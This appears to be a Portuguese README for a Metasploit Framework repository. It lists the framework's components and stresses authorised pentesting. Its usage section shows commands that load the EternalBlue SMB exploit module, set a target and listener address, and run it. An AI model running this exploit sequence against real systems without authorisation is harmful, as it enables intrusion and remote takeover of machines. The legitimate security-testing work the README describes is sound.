# Metasploit Framework

> **Ferramenta Legítima de Pentest** - Framework padrão da indústria para testes de segurança autorizados e assessments de vulnerabilidade.

[![Ruby](https://img.shields.io/badge/Ruby-3.x-CC342D?style=flat-square&logo=ruby&logoColor=white)](#)
[![License](https://img.shields.io/badge/License-Metasploit%20License-blue.svg)](#)

## Sobre

O **Metasploit Framework** é a ferramenta mais widely used para testes de segurança e assessments de vulnerabilidade no mundo. Esta é uma instalação completa do framework.

### Uso Legítimo

- Pentest autorizado por contrato
- Assessments de vulnerabilidade
- Treinamento e educação em segurança
- Validação de controles de segurança

## Componentes

| Componente | Descrição |
|------------|-----------|
| Exploits | Módulos de exploração de vulnerabilidades |
| Payloads | Código executado no alvo |
| Auxiliary | Ferramentas de scanning e enumeração |
| Post | Módulos pós-exploração |
| Encoders | Ofuscação de payloads |
| Nops | Generators de NOP sled |

## Como Usar

```bash
# Iniciar o console
msfconsole

# Buscar exploits
search type:exploit platform:windows

# Usar um exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar opções
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10

# Executar
exploit
```

## Ética e Legalidade

> ⚠️ **Use apenas em sistemas para os quais você tem autorização explícita por escrito.** O uso não autorizado de ferramentas de pentest é ilegal na maioria dos países.

## Autor

**Rafael Melinsky** - Pesquisador de Segurança

- GitHub: [@melinskyRf](https://github.com/melinskyRf)

---

> 🛡️ **Ferramenta de Segurança** - Para testes autorizados apenas.
